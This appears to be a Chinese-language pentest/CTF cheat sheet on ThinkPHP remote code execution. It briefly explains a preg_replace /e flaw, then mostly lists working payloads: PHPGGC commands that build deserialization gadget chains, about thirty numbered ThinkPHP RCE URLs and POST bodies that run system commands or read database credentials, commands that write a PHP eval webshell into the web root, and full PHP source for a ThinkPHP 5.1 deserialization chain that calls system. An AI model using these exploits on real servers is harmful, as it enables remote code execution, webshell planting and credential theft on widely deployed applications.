


**thinkphp rce漏洞**：比如5.0版本有个rce漏洞，该漏洞的漏洞关键点存在于thinkphp/library/think/Request.php文件中
在docker中复现了多种版本的rce漏洞。

**漏洞的原理有了解吗,攻击后的返回包的有分析过吗?**
THINKPHP RCE漏洞的原理：举例有一个RCE是这样的：Dispatcher.class.php中res参数中使用了preg_replace的/e危险参数，使得preg_replace第二个参数就会被当做php代码执行，导致存在一个代码执行漏洞，攻击者可以利用构造的恶意URL执行任意PHP代码。

^
phpMyadmin漏洞：
<https://dummykitty.github.io/php/2020/11/22/phpmyadmin-%E5%90%8E%E5%8F%B0-getshell-%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86.html#cve-2013-3238>


^
## **php框架反序列化利用工具PHPGGC**
>PHPGGC 是一个 unserialize（） 有效负载库，以及从命令行或编程方式生成它们的工具*。 当您在没有代码的网站上遇到反序列化时，或者只是在尝试构建漏洞时，此工具允许您生成有效负载，而无需经历查找小工具并组合它们的繁琐步骤。它可以被视为相当于[frohoff的ysoserial](https://github.com/frohoff/ysoserial)，但对于PHP。 目前，该工具支持小工具链，例如：CodeIgniter4，Doctrine，Drupal7，Guzzle，Laravel，Magento，Monolog，Phalcon，Podio，Slim，SwiftMailer，Symfony，Wordpress，Yii和ZendFramework，wordpress。

安装：
<https://www.cnblogs.com/xrzxyyds/p/the-introduction-and-installation-of-the-use-of-phpggc-s81yc.html>
```
克隆进入目录即可使用
https://github.com/ambionics/phpggc
```

使用：
```
./phpggc -l
列出全部

./phpggc -l Laravel

./phpggc -i Laravel/RCE2 
列出

./phpggc  Laravel/RCE2 system 'tac /fl*' |base64
生成序列化串

./phpggc ThinkPHP/RCE3 system() "cat /flag" --base64`
./phpggc Yii2/RCE1 exec 'cp /fla* test.txt' --URL
```



^
## **Thinkphp RCE　POC大全**
在 Vulhub 中，也可以找到了该漏洞的利用 POC

**Thinkphp 5.0.22 POC**
1. `http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.username`
2. `http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.password`
3. `http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id`
4. `http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1`

**Thinkphp 5 POC**
5. `http://127.0.0.1/tp5/public/?s=index/\think\View/display&content=%22%3C?%3E%3C?php%20phpinfo();?%3E&data=1`

**Thinkphp 5.0.21 POC**
6. `http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id`
7. `http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1`

**Thinkphp 5.1.x POC**
8. `http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=phpinfo&data=1`
9. `http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=system&data=cmd`
10. `http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E`
11. `http://url/to/thinkphp5.1.29/?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E`
12. `http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1`
13. `http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd`
14. `http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1`
15. `http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd`

**Thinkphp 未知版本 POC**
16. `?s=index/\think\module/action/param1/${@phpinfo()}`
17. `?s=index/\think\Module/Action/Param/${@phpinfo()}`
18. `?s=index/\think/module/aciton/param1/${@print(THINK_VERSION)}`

**Thinkphp 5.0.23 (完整版) debug模式 POC**
32. `(post)public/index.php 
32. (data)_method=__construct&filter[]=system&server[REQUEST_METHOD]=touch%20/tmp/xxx`

```
echo "<?php phpinfo();?>" > /var/www/public/test2.php

echo "<?php @eval(\$_POST['cmd']);?>" > /var/www/public/test.php
```




**Thinkphp 5.0.23 (完整版) POC**
33. `（post）public/index.php?s=captcha
33.  (data) _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls -al`

**Thinkphp 5.0.10 (完整版) POC**
34. `(post)public/index.php?s=index/index/index (data)s=whoami&_method=__construct&method&filter[]=system`

**Thinkphp 5.1.x 和 5.2.x 和 5.0.x POC**
35. `(post)public/index.php (data)c=exec&f=calc.exe&_method=filter`





^

## **Tinkphp 5.1反序列化**
入口
```
?&lin=cat /flag&data=序列化串
?lin=id  POST  code=序列化串
```
```
<?php
namespace think;
abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        $this->append = ["lin"=>["calc.exe","calc"]];
        $this->data = ["lin"=>new Request()];
    }
}
class Request
{
    protected $hook = [];
    protected $filter = "system"; //PHP函数
    protected $config = [
        // 表单ajax伪装变量
        'var_ajax'         => '_ajax',  
    ];
    function __construct(){
        $this->filter = "system";
        $this->config = ["var_ajax"=>'lin']; //PHP函数的参数
        $this->hook = ["visible"=>[$this,"isAjax"]];
    }
}


namespace think\process\pipes;

use think\model\concern\Conversion;
use think\model\Pivot;
class Windows
{
    private $files = [];

    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}
namespace think\model;

use think\Model;

class Pivot extends Model
{
}
use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
?>
```